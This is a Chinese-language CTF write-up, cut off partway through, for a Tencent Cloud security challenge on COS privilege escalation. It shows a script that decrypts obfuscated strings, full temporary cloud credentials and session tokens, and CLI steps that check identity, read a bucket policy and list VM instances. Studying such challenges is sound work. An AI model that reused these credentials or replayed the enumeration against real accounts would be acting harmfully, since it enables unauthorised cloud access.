# 腾讯云安全挑战赛2025wp


&lt;!--more--&gt;

## 前言

腾讯出了个云安全挑战赛，一年有六期，针对的是自家服务，如 cos 等，应该是对标国外 wiz 的月赛，不出意外的话每期都会打一下，所以这篇 wp 应该是会持续更新中

## 1-COS提权与利用

解密脚本

```
import base64
from typing import Optional

KEY = b&#34;Lxnt1evByMdubwx9&#34;  

DATA = [
    &#34;f5c0IajdxV5eVjXjZL7eYXn/8TRigzvvoMHicHjAF&#43;2fYjYNyxz7GaIlcemYMPY6sIftXGoliO4vGWY&#43;3BUGsP/oIYMQP3QYC0oL/H7Wa20=&#34;,
    &#34;zKgyUbTtAghnzfmaHNHYdWvzlcTYqJt9aiMcsXRZVx0DvlWf0Gj6gx&#43;r7S0cDZB1T/GszB4Soj0cHkbPC6TFsDx4UfhOQF6UaQ&#43;jyuH8CbKHhnJqvrM7XINfLw8Ciwj4Iw3ydAaU5s5VS1BsHuJqeCAlPGF0BaTv45iaL//SJObHe&#43;grFNPKDhJsLfk4ZqmmHlt5MYIsja5I1pG756DWS/nwzQR/VpV/oXKucRrb7ZU=&#34;,
    &#34;LcQJPx4C3QLMP6FCg7LZiA==&#34;,
    &#34;M/5OfYlXv69rGbpWpS3StQ==&#34;,
    &#34;EQvKwDX7dY92&#43;pllBJ07&#43;OXaSC5ebcc3U3XPpPtNYvM=&#34;,
    &#34;MgkE9JTw5fUTSYvyQKBfFw==&#34;,
    &#34;MgkE9JTw5fUTSYvyQKBfFw==&#34;,
    &#34;y2iOBN6&#43;m4LXl&#43;5oKipU2qjfXHyCsLw0l&#43;p/v3cSqPc=&#34;,
    &#34;pXG83JbitgEqtVYeh84f0Q==&#34;,
    &#34;0yrL8z5DCpVMMLIqsNgKWhakEvoQBz6JYZBii6gszbs=&#34;,
    &#34;y2iOBN6&#43;m4LXl&#43;5oKipU2qjfXHyCsLw0l&#43;p/v3cSqPc=&#34;,
    &#34;y2iOBN6&#43;m4LXl&#43;5oKipU2qjfXHyCsLw0l&#43;p/v3cSqPc=&#34;,
    &#34;lvSA8w7VxVeGXKlGMKudyOXaSC5ebcc3U3XPpPtNYvM=&#34;,
    &#34;yVwXQuzRFa/QrCfUbQmTNhbcG5zRqvZr/0xdeH40eaYelVLemG27zQ5lRugzqJ1b&#34;,
    &#34;yVwXQuzRFa/QrCfUbQmTNqW/Xe/gznGzrFAZX4FtuFoelVLemG27zQ5lRugzqJ1b&#34;,
    &#34;yVwXQuzRFa/QrCfUbQmTNgJcKv9GTUTyC6vkp1YbTGVysQYDBniEBjebTZ5oprEQ&#34;,
    &#34;jiIi5TuBvaPaTOUxy5UeXw==&#34;,
    &#34;5dpILl5txzdTdc&#43;k&#43;01i8w==&#34;,
    &#34;Xwjo9538numKdVOf8Vh4cE78T18&#43;6TwNy3pgqXy7tYb5yVtGSgxDhPNOnqo0lDCzBLGnWanr7bxhlsLmeVJIOpDBLi/DWjMg8hjHMwtt5RQsVhvyvSJ6Ps9g1P&#43;pfAjx&#34;,
    &#34;xH3OngU0AEUjMBlvI0gZrm11cDVQ9PhpXofmHTxRgvOAlKjgRHDmwP0qXIL/Dxkfx2qGTPxXDwaSyqTaQgytLg==&#34;,
    &#34;Pzk6aAkFE1N1ctcijLbyEeXfrGGVQ0sDdZ3bKsM4yxILvkCjXEaUM8dVWffz6Sil1U2bSszksAuUE8X/fmrh1ozdiRHbs/gv1nu6T/tDHePygRV2tpSWVj8mjDLsNviWHDnUFrGSEa6TkGGRvdI2ANsVsXQg7FGQRRzdoHvnrP74vEjkezrkLNLuwCJhJ7Okz1CTpOR&#43;zDVkIR8NGn&#43;nBTLb0I05ZPrsNVNEW475JI28iLND80w1UPfaBzN8lE8WBKMFqQfGp7vvw/UJ9O6x4K0QvNM8CoO2jqPbV9XoeTAWArROvj&#43;HuHshrr0qlEdE1QB1pC6xxQAS5F09AuMZ0JgBN6n7CYhI/feY76UGg1jGwWnXhyJ2043vFpLNji5Hwk0SSJ2pi5bsoTE1ipsm8TpppD/KND8Y4NPU5VnjWVcz7Ib0A1frMTsGKjQNBqPb7y2c0zu5nck3aAi4&#43;iL36pkR4LaeYb/NXE89zJQhLUJzH&#43;rjHHLrTo&#43;DoPG5AtMG/H9/qtGxwD11Ox3qRQg1FpBFy&#43;nSf348ZT0sRED14vzUKmcptDdeNord5Q/k5GI7cAl8DysyyWSgVet/LlljCzvDqr70wRhu31uv4AL27Vq9Y9ee9qOkvWY&#43;QN4eBUK&#43;mD/LJyKA3C8zuRPbeDT7KkXW&#43;JpPd&#43;sue1UisMskKA&#43;MxIAsAxCrxXQfYLAKXSErP2uLlE3VRjb0lZXYewkEvOBcz/BVxR3lyyQdbHL3Uo5euY/yWySBUEmkgeeC7wtVjbcV8wDewfPx2YV5gW4jXacDR56XG591wdPzpZMMk3rdnBx4yFGX93g0kAlXvdoPnd2UFsdnavYd&#43;&#43;X2rmTBdjOo/jGuH/gWJ7m5oLzsVC24W4eVS7RURyFmQ7FKb7JC3xdQVWYKzD/HgEdQ5dPcEzgT/fWkc&#43;Iy31zfp2WLYco1FGSCONok8VchDlvRKjH5tgV4ZiWG2I2254XRB5nwgVy9EkZPW/CbCz78zQBXXtmmzZt4cDtGCFCPYKMMXUyNTD4RPFU6h6orOVg6H7KcQO8KhSE0LnleygySrue5E6IIWinPy1vRlDB9HVG&#43;u0eWbNZLKxa1cOSyi3&#43;eD9EunA049WzMQE3bZBsXVZh8aBN9&#43;p9JJYnZbu0GdBewIJy22rS0iCTL9R40CW8LSVlm2XA2ozYLw3AzXXbS8EgK1zA5umnrPLSQtyQXh6tPT9lIfd4FPcLdfcJqXv69K2WX1rThIybol7A8Z7seaVJpFuJ3WtDhtyTuDkl/c1s1QRsqW41Bx87kC6NCiSTzlcbtQg==&#34;,
    &#34;y2iOBN6&#43;m4LXl&#43;5oKipU2qjfXHyCsLw0l&#43;p/v3cSqPc=&#34;,
    &#34;x3lpg57ERvpVLrn83osro5kYWOcXD1WP&#43;7hoGTXF95Zn1tPhRUZ8jl6it2l7P2dP5dpILl5txzdTdc&#43;k&#43;01i8w==&#34;,
    &#34;nQe10a7TnkOr/Ppd&#43;&#43;egqGi535SDz26TF3POeWJkfBvmaMo5aBJ0/&#43;JogjC/WxHq&#34;,
    &#34;R&#43;koVdpCqrYoUtcwv9vXysqBKV8eNMz2HJHMRG2nsm0=&#34;
]


def _try_pycryptodome(raw: bytes) -&gt; Optional[bytes]:
    try:
        from Crypto.Cipher import AES as _AES
        from Crypto.Util.Padding import unpad as _unpad
        cipher = _AES.new(KEY, _AES.MODE_ECB)
        dec = cipher.decrypt(raw)
        return _unpad(dec, 16)
    except Exception:
        return None

def _try_cryptography(raw: bytes) -&gt; Optional[bytes]:
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        cipher = Cipher(algorithms.AES(KEY), modes.ECB())
        decryptor = cipher.decryptor()
        dec = decryptor.update(raw) &#43; decryptor.finalize()
        pad = dec[-1]
        if not (1 &lt;= pad &lt;= 16):
            raise ValueError(&#34;Bad padding&#34;)
        return dec[:-pad]
    except Exception:
        return None

def aes_ecb_pkcs5_decrypt(b64s: str) -&gt; str:
    raw = base64.b64decode(b64s)
    dec = _try_pycryptodome(raw)
    if dec is None:
        dec = _try_cryptography(raw)
    if dec is None:
        raise RuntimeError(&#34;No AES backend available. Please install pycryptodome or cryptography.&#34;)
    return dec.decode(&#34;utf-8&#34;, errors=&#34;replace&#34;)

def looks_like_base64(s: str) -&gt; bool:
    try:
        base64.b64decode(s, validate=True)
        return True
    except Exception:
        return False

def deobfuscate_xor_from_b64(s: str) -&gt; str:
    data = base64.b64decode(s)
    data = bytes(b ^ 0x23 for b in data) 
    return data.decode(&#34;utf-8&#34;, errors=&#34;replace&#34;)


if __name__ == &#34;__main__&#34;:
    for i, enc in enumerate(DATA):
        try:
            plain = aes_ecb_pkcs5_decrypt(enc)
            print(f&#34;[{i:02d}] AES  -&gt; {plain}&#34;)
            if looks_like_base64(plain):
                try:
                    deobf = deobfuscate_xor_from_b64(plain)
                    print(f&#34;     XOR  -&gt; {deobf}&#34;)
                except Exception as e:
                    print(f&#34;     XOR  -&gt; (failed: {e})&#34;)
        except Exception as e:
            print(f&#34;[{i:02d}] ERROR: {e}&#34;)
```

配置下 secretid 和 secretkey

```
┌──(root㉿lll)-[~]
└─# tccli configure
TencentCloud API secretId[None]: AKIDFG840k8ov09ZfQ6VdlfW-7Xpyyn0Uuak6bH_YS1CqANS0iZ995r00MAXrPhbEjVX
TencentCloud API secretKey[None]: /HihyTU6/YmEf8nD1ujPZi8DthZiI7b&#43;9eZKS76jpAg=
Default region name[ap-guangzhou]: ap-guangzhou
Default output format[json]: json
```

token 需要手动去配置下

```
┌──(root㉿lll)-[~]
└─# cat .tccli/default.credential
{
  &#34;secretId&#34;: &#34;AKIDrGuURY3ThyLSMqDsEv1ecnGSsRP0m0krNNUWUgTvqr_IitXJvmdelZq8dx5XEtt3&#34;,
  &#34;secretKey&#34;: &#34;q9wsCzWhmEp3E/DvDhld/MMiuDo8yTn0shcpM7wBB1o=&#34;,
  &#34;token&#34;: &#34;ukN1JfAFyFEJbyw3cdc5TTdUzPBhknna27c03053a861748506b924176014da27MuPprHAIl3oB2kxiKigKZ3oP1nsJz1BPLiljMlfGOSIlVWWb9uk_wtk1LKFaWPcJUJ44PxuPnc_f3dRc26dfmvJnOxgtmzdfjeZMsyq0iUbwcO1Be0_UlwREY9GPw4hvvUqdUkv6SJyb-6yVNoDA0hXnUBUgEKFRCGAJ7bs5_8tq_gok265jvp7Nes1NJ_ZEedEff4Tzd5iXb6Ix1ZSyGe4Yy4TJEcs2ixHvSXsCpqNLNSCR1JDSOG66GrfAqO0bC-uvsVrwva49kxchxWa_NR9cRaSoSumJE-N2siJ2pUZhDuqvNBUujkbHKo6Tqtg7Z8-mLjmfxZOY3HhJZOoR73Drqhpt6ILX4IcEuoNyOEQ9lkjg10lW_OoCKQmv__Iey6_9IqWYfIVgOwChCYGzhD-TrEHmjGickxNXzG3qKEez8YTWc973G7UhBplySXuq0oziGVjfWOxQ3MqocCTsyONWyZHsIo9RdnsZNuzvMFyR6JBgc-2l1r2p5hNunusTalPtZWsi0nBj3Co0ZRDe_OQqv6Xkbpn4eVgiryKLKwH4iTid2nCTBY9kDj0tS76_U_QVlLIK3zagu5xF3RR37Xy3BE_29q-XkbX8S0nNM1wwUAVO6L_zWUMUwaWu2UkDab1OXi-RV98a8N6bs9WCtA&#34;
}

┌──(root㉿lll)-[~]
└─# tccli sts GetCallerIdentity
{
    &#34;Arn&#34;: &#34;qcs::sts:100026992078:federated-user/100043488407&#34;,
    &#34;AccountId&#34;: &#34;100026992078&#34;,
    &#34;UserId&#34;: &#34;100043488407:challenge_01_q81gl6k4osny&#34;,
    &#34;PrincipalId&#34;: &#34;100043488407&#34;,
    &#34;Type&#34;: &#34;CAMUser&#34;,
    &#34;RequestId&#34;: &#34;ab10f09b-42a7-4dcf-a96a-a85a0feb54c7&#34;
}
```

后续发现很多命令有问题，还是用 aws 吧

```
┌──(root㉿lll)-[~]
└─# cat .aws/config
[default]
region = ap-guangzhou
s3 =
    endpoint_url = https://cos.ap-guangzhou.myqcloud.com

┌──(root㉿lll)-[~]
└─# cat .aws/credentials
[default]
aws_access_key_id = AKIDrGuURY3ThyLSMqDsEv1ecnGSsRP0m0krNNUWUgTvqr_IitXJvmdelZq8dx5XEtt3
aws_secret_access_key = q9wsCzWhmEp3E/DvDhld/MMiuDo8yTn0shcpM7wBB1o=
aws_session_token = ukN1JfAFyFEJbyw3cdc5TTdUzPBhknna27c03053a861748506b924176014da27MuPprHAIl3oB2kxiKigKZ3oP1nsJz1BPLiljMlfGOSIlVWWb9uk_wtk1LKFaWPcJUJ44PxuPnc_f3dRc26dfmvJnOxgtmzdfjeZMsyq0iUbwcO1Be0_UlwREY9GPw4hvvUqdUkv6SJyb-6yVNoDA0hXnUBUgEKFRCGAJ7bs5_8tq_gok265jvp7Nes1NJ_ZEedEff4Tzd5iXb6Ix1ZSyGe4Yy4TJEcs2ixHvSXsCpqNLNSCR1JDSOG66GrfAqO0bC-uvsVrwva49kxchxWa_NR9cRaSoSumJE-N2siJ2pUZhDuqvNBUujkbHKo6Tqtg7Z8-mLjmfxZOY3HhJZOoR73Drqhpt6ILX4IcEuoNyOEQ9lkjg10lW_OoCKQmv__Iey6_9IqWYfIVgOwChCYGzhD-TrEHmjGickxNXzG3qKEez8YTWc973G7UhBplySXuq0oziGVjfWOxQ3MqocCTsyONWyZHsIo9RdnsZNuzvMFyR6JBgc-2l1r2p5hNunusTalPtZWsi0nBj3Co0ZRDe_OQqv6Xkbpn4eVgiryKLKwH4iTid2nCTBY9kDj0tS76_U_QVlLIK3zagu5xF3RR37Xy3BE_29q-XkbX8S0nNM1wwUAVO6L_zWUMUwaWu2UkDab1OXi-RV98a8N6bs9WCtA
```

先看下当前用户，这里报错是因为腾讯云 STS API 不是 S3 协议兼容的，而是走的 TC3-HMAC-SHA256 签名体系

```
┌──(root㉿lll)-[~]
└─# aws --endpoint-url https://sts.tencentcloudapi.com sts get-caller-identity

Unable to parse response (not well-formed (invalid token): line 1, column 0), invalid XML received. Further retries may succeed:
b&#39;{&#34;Response&#34;:{&#34;Error&#34;:{&#34;Code&#34;:&#34;MissingParameter&#34;,&#34;Message&#34;:&#34;The request header is missing a required common parameter `X-TC-Action`.&#34;},&#34;RequestId&#34;:&#34;6d5608bf-1a85-4a9c-8363-6395952d4191&#34;}}&#39;
```

可以用 tccli 看

```
┌──(root㉿lll)-[~]
└─# tccli sts GetCallerIdentity
{
    &#34;Arn&#34;: &#34;qcs::sts:100026992078:federated-user/100043488407&#34;,
    &#34;AccountId&#34;: &#34;100026992078&#34;,
    &#34;UserId&#34;: &#34;100043488407:challenge_01_xkeb6gd9n2ee&#34;,
    &#34;PrincipalId&#34;: &#34;100043488407&#34;,
    &#34;Type&#34;: &#34;CAMUser&#34;,
    &#34;RequestId&#34;: &#34;158c4139-4eeb-4c17-948a-ab394bd9b14f&#34;
}
```

拿到 bucket 名字 （这个是字段是根据 py 脚本回显来判断的）

![image-20250910193917768](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250919160323058.png)

看下该 bucket 下的所有 object，权限不够

```
┌──(root㉿lll)-[~]
└─# aws --endpoint-url https://xkeb6gd9n2ee-1313380398.cos.ap-guangzhou.myqcloud.com s3 ls

An error occurred (AccessDenied) when calling the ListBuckets operation: Access Denied.
```

看下该 bucket 的策略，COS 不支持 path-style 访问方式，必须用 virtual-hosted style，改下配置文件

```
┌──(root㉿lll)-[~]
└─# cat .aws/config
[default]
region = ap-guangzhou
s3 =
    addressing_style = virtual
    
┌──(root㉿lll)-[~]
└─# aws s3api get-bucket-policy --bucket 21cf8bc7bq56-1313380398 --endpoint-url http://cos.ap-guangzhou.myqcloud.com  --output text | python3 -m json.tool
{
    &#34;Statement&#34;: [
        {
            &#34;Action&#34;: [
                &#34;name/cos:PutBucketACL&#34;
            ],
            &#34;Condition&#34;: {
                &#34;ip_not_equal&#34;: {
                    &#34;qcs:ip&#34;: [
                        &#34;43.138.212.54&#34;,
                        &#34;172.16.0.22&#34;
                    ]
                }
            },
            &#34;Effect&#34;: &#34;Deny&#34;,
            &#34;Principal&#34;: {
                &#34;qcs&#34;: [
                    &#34;qcs::cam::uin/100026992078:uin/100043488407&#34;
                ]
            },
            &#34;Resource&#34;: [
                &#34;qcs::cos:ap-guangzhou:uid/1313380398:21cf8bc7bq56-1313380398/*&#34;
            ],
            &#34;Sid&#34;: &#34;costs-1757861762000000978297-46861-45&#34;
        }
    ],
    &#34;version&#34;: &#34;2.0&#34;
}
```

有 PutBucketACL 权限，但限制了 ip，试了下 tccli cam 所有指令，有三个有权限，但都没用，aws s3api 也试了下，除了 get-bucket-policy 都不行

查看当前 STS 权限范围内的云主机实例列表

```
┌──(root㉿lll)-[~]
└─# tccli cvm DescribeInstances
{
    &#34;TotalCount&#34;: 4,
    &#34;InstanceSet&#34;: [
        {
            &#34;Placement&#34;: {
                &#34;Zone&#34;: &#34;ap-guangzhou-6&#34;,
                &#34;ProjectId&#34;: 0,
                &#34;HostIds&#34;: null,
                &#34;HostId&#34;: null
            },
            &#34;InstanceId&#34;: &#34;ins-hc0ktysk&#34;,
            &#34;InstanceType&#34;: &#34;S5.SMALL2&#34;,
            &#34;CPU&#34;: 1,
            &#34;Memory&#34;: 2,
            &#34;RestrictState&#34;: &#34;NORMAL&#34;,
            &#34;InstanceName&#34;: &#34;未命名&#34;,
            &#34;InstanceChargeType&#34;: &#34;POSTPAID_BY_HOUR&#34;,
            &#34;SystemDisk&#34;: {
                &#34;DiskType&#34;: &#34;CLOUD_PREMIUM&#34;,
                &#34;DiskId&#34;: &#34;disk-qisb5xd4&#34;,
                &#34;DiskSize&#34;: 20,
                &#34;CdcId&#34;: null,
                &#34;DiskName&#34;: null
            },
            &#34;DataDisks&#34;: [],
            &#34;PrivateIpAddresses&#34;: [
                &#34;172.16.0.22&#34;
            ],
            &#34;PublicIpAddresses&#34;: [
                &#34;43.138.212.54&#34;
            ],
            &#34;InternetAccessible&#34;: {
                &#34;InternetChargeType&#34;: &#34;TRAFFIC_POSTPAID_BY_HOUR&#34;,
                &#34;InternetMaxBandwidthOut&#34;: 10,
                &#34;PublicIpAssigned&#34;: null,
                &#34;BandwidthPackageId&#34;: null,
                &#34;InternetServiceProvider&#34;: null,
                &#34;IPv4AddressType&#34;: null,
                &#34;IPv6AddressType&#34;: null,
                &#34;AntiDDoSPackageId&#34;: null
            },
            &#34;VirtualPrivateCloud&#34;: {
                &#34;VpcId&#34;: &#34;vpc-7ub7effn&#34;,
                &#34;SubnetId&#34;: &#34;subnet-3do61d96&#34;,
                &#34;AsVpcGateway&#34;: false,
                &#34;PrivateIpAddresses&#34;: null,
                &#34;Ipv6AddressCount&#34;: null
            },
            &#34;ImageId&#34;: &#34;img-541bm08j&#34;,
            &#34;RenewFlag&#34;: null,
            &#34;CreatedTime&#34;: &#34;2025-09-14T14:56:00Z&#34;,
            &#34;ExpiredTime&#34;: null,
            &#34;OsName&#34;: &#34;Debian 12.8 64位&#34;,
            &#34;SecurityGroupIds&#34;: [
                &#34;sg-3zaeh3e3&#34;
            ],
            &#34;LoginSettings&#34;: {
                &#34;Password&#34;: null,
                &#34;KeyIds&#34;: null,
                &#34;KeepImageLogin&#34;: null
            },
            &#34;InstanceState&#34;: &#34;RUNNING&#34;,
            &#34;Tags&#34;: [],
            &#34;StopChargingMode&#34;: &#34;NOT_APPLICABLE&#34;,
            &#34;Uuid&#34;: &#34;9d73e6a3-598d-4111-896f-ff1c294cddb1&#34;,
            &#34;LatestOperation&#34;: null,
            &#34;LatestOperationState&#34;: null,
            &#34;LatestOperationRequestId&#34;: null,
            &#34;DisasterRecoverGroupId&#34;: &#34;&#34;,
            &#34;IPv6Addresses&#34;: null,
            &#34;CamRoleName&#34;: &#34;&#34;,
            &#34;HpcClusterId&#34;: &#34;&#34;,
            &#34;RdmaIpAddresses&#34;: null,
            &#34;DedicatedClusterId&#34;: &#34;&#34;,
            &#34;IsolatedSource&#34;: &#34;NOTISOLATED&#34;,
            &#34;GPUInfo&#34;: null,
            &#34;LicenseType&#34;: &#34;TencentCloud&#34;,
            &#34;DisableApiTermination&#34;: false,
            &#34;DefaultLoginUser&#34;: &#34;root&#34;,
            &#34;DefaultLoginPort&#34;: 22,
            &#34;LatestOperationErrorMsg&#34;: null,
            &#34;PublicIPv6Addresses&#34;: null
        },
        {
            &#34;Placement&#34;: {
                &#34;Zone&#34;: &#34;ap-guangzhou-6&#34;,
                &#34;ProjectId&#34;: 0,
                &#34;HostIds&#34;: null,
                &#34;HostId&#34;: null
            },
            &#34;InstanceId&#34;: &#34;ins-kqxiiir0&#34;,
            &#34;InstanceType&#34;: &#34;S5.SMALL2&#34;,
            &#34;CPU&#34;: 1,
            &#34;Memory&#34;: 2,
            &#34;RestrictState&#34;: &#34;NORMAL&#34;,
            &#34;InstanceName&#34;: &#34;未命名&#34;,
            &#34;InstanceChargeType&#34;: &#34;POSTPAID_BY_HOUR&#34;,
            &#34;SystemDisk&#34;: {
                &#34;DiskType&#34;: &#34;CLOUD_PREMIUM&#34;,
                &#34;DiskId&#34;: &#34;disk-qeucl7za&#34;,
                &#34;DiskSize&#34;: 20,
                &#34;CdcId&#34;: null,
                &#34;DiskName&#34;: null
            },
            &#34;DataDisks&#34;: [],
            &#34;PrivateIpAddresses&#34;: [
                &#34;172.16.0.99&#34;
            ],
            &#34;PublicIpAddresses&#34;: [
                &#34;119.29.168.151&#34;
            ],
            &#34;InternetAccessible&#34;: {
                &#34;InternetChargeType&#34;: &#34;TRAFFIC_POSTPAID_BY_HOUR&#34;,
                &#34;InternetMaxBandwidthOut&#34;: 10,
                &#34;PublicIpAssigned&#34;: null,
                &#34;BandwidthPackageId&#34;: null,
                &#34;InternetServiceProvider&#34;: null,
                &#34;IPv4AddressType&#34;: null,
                &#34;IPv6AddressType&#34;: null,
                &#34;AntiDDoSPackageId&#34;: null
            },
            &#34;VirtualPrivateCloud&#34;: {
                &#34;VpcId&#34;: &#34;vpc-7ub7effn&#34;,
                &#34;SubnetId&#34;: &#34;subnet-3do61d96&#34;,
                &#34;AsVpcGateway&#34;: false,
                &#34;PrivateIpAddresses&#34;: null,
                &#34;Ipv6AddressCount&#34;: null
            },
            &#34;ImageId&#34;: &#34;img-541bm08j&#34;,
            &#34;RenewFlag&#34;: null,
            &#34;CreatedTime&#34;: &#34;2025-09-14T14:34:43Z&#34;,
            &#34;ExpiredTime&#34;: null,
            &#34;OsName&#34;: &#34;Debian 12.8 64位&#34;,
            &#34;SecurityGroupIds&#34;: [
                &#34;sg-3zaeh3e3&#34;
            ],
            &#34;LoginSettings&#34;: {
                &#34;Password&#34;: null,
                &#34;KeyIds&#34;: null,
                &#34;KeepImageLogin&#34;: null
            },
            &#34;InstanceState&#34;: &#34;RUNNING&#34;,
            &#34;Tags&#34;: [],
            &#34;StopChargingMode&#34;: &#34;NOT_APPLICABLE&#34;,
            &#34;Uuid&#34;: &#34;05451a3a-6e84-469a-909e-9bead1bb8a51&#34;,
            &#34;LatestOperation&#34;: &#34;ResetInstancesPassword&#34;,
            &#34;LatestOperationState&#34;: &#34;SUCCESS&#34;,
            &#34;LatestOperationRequestId&#34;: &#34;4c01935c-b1ee-42b2-8a86-e446772c1bf4&#34;,
            &#34;DisasterRecoverGroupId&#34;: &#34;&#34;,
            &#34;IPv6Addresses&#34;: null,
            &#34;CamRoleName&#34;: &#34;&#34;,
            &#34;HpcClusterId&#34;: &#34;&#34;,
            &#34;RdmaIpAddresses&#34;: null,
            &#34;DedicatedClusterId&#34;: &#34;&#34;,
            &#34;IsolatedSource&#34;: &#34;NOTISOLATED&#34;,
            &#34;GPUInfo&#34;: null,
            &#34;LicenseType&#34;: &#34;TencentCloud&#34;,
            &#34;DisableApiTermination&#34;: false,
            &#34;DefaultLoginUser&#34;: &#34;root&#34;,
            &#34;DefaultLoginPort&#34;: 22,
            &#34;LatestOperationErrorMsg&#34;: null,
            &#34;PublicIPv6Addresses&#34;: null
        },
        {
            &#34;Placement&#34;: {
                &#34;Zone&#34;: &#34;ap-guangzhou-6&#34;,
                &#34;ProjectId&#34;: 0,
                &#34;HostIds&#34;: null,
                &#34;HostId&#34;: null
            },
            &#34;InstanceId&#34;: &#34;ins-4boooefe&#34;,
            &#34;InstanceType&#34;: &#34;S5.SMALL2&#34;,
            &#34;CPU&#34;: 1,
            &#34;Memory&#34;: 2,
            &#34;RestrictState&#34;: &#34;NORMAL&#34;,
            &#34;InstanceName&#34;: &#34;未命名&#34;,
            &#34;InstanceChargeType&#34;: &#34;POSTPAID_BY_HOUR&#34;,
            &#34;SystemDisk&#34;: {
                &#34;DiskType&#34;: &#34;CLOUD_PREMIUM&#34;,
                &#34;DiskId&#34;: &#34;disk-gqbh7b60&#34;,
                &#34;DiskSize&#34;: 20,
                &#34;CdcId&#34;: null,
                &#34;DiskName&#34;: null
            },
            &#34;DataDisks&#34;: [],
            &#34;PrivateIpAddresses&#34;: [
                &#34;172.16.0.68&#34;
            ],
            &#34;PublicIpAddresses&#34;: [
                &#34;114.132.230.48&#34;
            ],
            &#34;InternetAccessible&#34;: {
                &#34;InternetChargeType&#34;: &#34;TRAFFIC_POSTPAID_BY_HOUR&#34;,
                &#34;InternetMaxBandwidthOut&#34;: 10,
                &#34;PublicIpAssigned&#34;: null,
                &#34;BandwidthPackageId&#34;: null,
                &#34;InternetServiceProvider&#34;: null,
                &#34;IPv4AddressType&#34;: null,
                &#34;IPv6AddressType&#34;: null,
                &#34;AntiDDoSPackageId&#34;: null
            },
            &#34;VirtualPrivateCloud&#34;: {
                &#34;VpcId&#34;: &#34;vpc-7ub7effn&#34;,
                &#34;SubnetId&#34;: &#34;subnet-3do61d96&#34;,
                &#34;AsVpcGateway&#34;: false,
                &#34;PrivateIpAddresses&#34;: null,
                &#34;Ipv6AddressCount&#34;: null
            },
            &#34;ImageId&#34;: &#34;img-541bm08j&#34;,
            &#34;RenewFlag&#34;: null,
            &#34;CreatedTime&#34;: &#34;2025-09-14T14:30:50Z&#34;,
            &#34;ExpiredTime&#34;: null,
            &#34;OsName&#34;: &#34;Debian 12.8 64位&#34;,
            &#34;SecurityGroupIds&#34;: [
                &#34;sg-3zaeh3e3&#34;
            ],
            &#34;LoginSettings&#34;: {
                &#34;Password&#34;: null,
                &#34;KeyIds&#34;: null,
                &#34;KeepImageLogin&#34;: null
            },
            &#34;InstanceState&#34;: &#34;RUNNING&#34;,
            &#34;Tags&#34;: [],
            &#34;StopChargingMode&#34;: &#34;NOT_APPLICABLE&#34;,
            &#34;Uuid&#34;: &#34;d94f308e-3011-41bd-96fb-05622f824a19&#34;,
            &#34;LatestOperation&#34;: null,
            &#34;LatestOperationState&#34;: null,
            &#34;LatestOperationRequestId&#34;: null,
            &#34;DisasterRecoverGroupId&#34;: &#34;&#34;,
            &#34;IPv6Addresses&#34;: null,
            &#34;CamRoleName&#34;: &#34;&#34;,
            &#34;HpcClusterId&#34;: &#34;&#34;,
            &#34;RdmaIpAddresses&#34;: null,
            &#34;DedicatedClusterId&#34;: &#34;&#34;,
            &#34;IsolatedSource&#34;: &#34;NOTISOLATED&#34;,
            &#34;GPUInfo&#34;: null,
            &#34;LicenseType&#34;: &#34;TencentCloud&#34;,
            &#34;DisableApiTermination&#34;: false,
            &#34;DefaultLoginUser&#34;: &#34;root&#34;,
            &#34;DefaultLoginPort&#34;: 22,
            &#34;LatestOperationErrorMsg&#34;: null,
            &#34;PublicIPv6Addresses&#34;: null
        },
        {
            &#34;Placement&#34;: {
                &#34;Zone&#34;: &#34;ap-guangzhou-6&#34;,
                &#34;ProjectId&#34;: 0,
                &#34;HostIds&#34;: null,
                &#34;HostId&#34;: null
            },
            &#34;InstanceId&#34;: &#34;ins-qo7kixfu&#34;,
            &#34;InstanceType&#34;: &#34;S5.SMALL2&#34;,
            &#34;CPU&#34;: 1,
            &#34;Memory&#34;: 2,
            &#34;RestrictState&#34;: &#34;NORMAL&#34;,
            &#34;InstanceName&#34;: &#34;未命名&#34;,
            &#34;InstanceChargeType&#34;: &#34;POSTPAID_BY_HOUR&#34;,
            &#34;SystemDisk&#34;: {
                &#34;DiskType&#34;: &#34;CLOUD_PREMIUM&#34;,
                &#34;DiskId&#34;: &#34;disk-4rr27ivi&#34;,
                &#34;DiskSize&#34;: 20,
                &#34;CdcId&#34;: null,
                &#34;DiskName&#34;: null
            },
            &#34;DataDisks&#34;: [],
            &#34;PrivateIpAddresses&#34;: [
                &#34;172.16.0.49&#34;
            ],
            &#34;PublicIpAddresses&#34;: [
                &#34;119.29.246.244&#34;
            ],
            &#34;InternetAccessible&#34;: {
                &#34;InternetChargeType&#34;: &#34;TRAFFIC_POSTPAID_BY_HOUR&#34;,
                &#34;InternetMaxBandwidthOut&#34;: 10,
                &#34;PublicIpAssigned&#34;: null,
                &#34;BandwidthPackageId&#34;: null,
                &#34;InternetServiceProvider&#34;: null,
                &#34;IPv4AddressType&#34;: null,
                &#34;IPv6AddressType&#34;: null,
                &#34;AntiDDoSPackageId&#34;: null
            },
            &#34;VirtualPrivateCloud&#34;: {
                &#34;VpcId&#34;: &#34;vpc-7ub7effn&#34;,
                &#34;SubnetId&#34;: &#34;subnet-3do61d96&#34;,
                &#34;AsVpcGateway&#34;: false,
                &#34;PrivateIpAddresses&#34;: null,
                &#34;Ipv6AddressCount&#34;: null
            },
            &#34;ImageId&#34;: &#34;img-541bm08j&#34;,
            &#34;RenewFlag&#34;: null,
            &#34;CreatedTime&#34;: &#34;2025-09-14T14:31:13Z&#34;,
            &#34;ExpiredTime&#34;: null,
            &#34;OsName&#34;: &#34;Debian 12.8 64位&#34;,
            &#34;SecurityGroupIds&#34;: [
                &#34;sg-3zaeh3e3&#34;
            ],
            &#34;LoginSettings&#34;: {
                &#34;Password&#34;: null,
                &#34;KeyIds&#34;: null,
                &#34;KeepImageLogin&#34;: null
            },
            &#34;InstanceState&#34;: &#34;RUNNING&#34;,
            &#34;Tags&#34;: [],
            &#34;StopChargingMode&#34;: &#34;NOT_APPLICABLE&#34;,
            &#34;Uuid&#34;: &#34;84802232-964e-435f-9cbf-2829954f95c7&#34;,
            &#34;LatestOperation&#34;: &#34;ResetInstancesPassword&#34;,
            &#34;LatestOperationState&#34;: &#34;SUCCESS&#34;,
            &#34;LatestOperationRequestId&#34;: &#34;a0b1c9c8-8edf-41cf-b42e-39aeeb5b5def&#34;,
            &#34;DisasterRecoverGroupId&#34;: &#34;&#34;,
            &#34;IPv6Addresses&#34;: null,
            &#34;CamRoleName&#34;: &#34;&#34;,
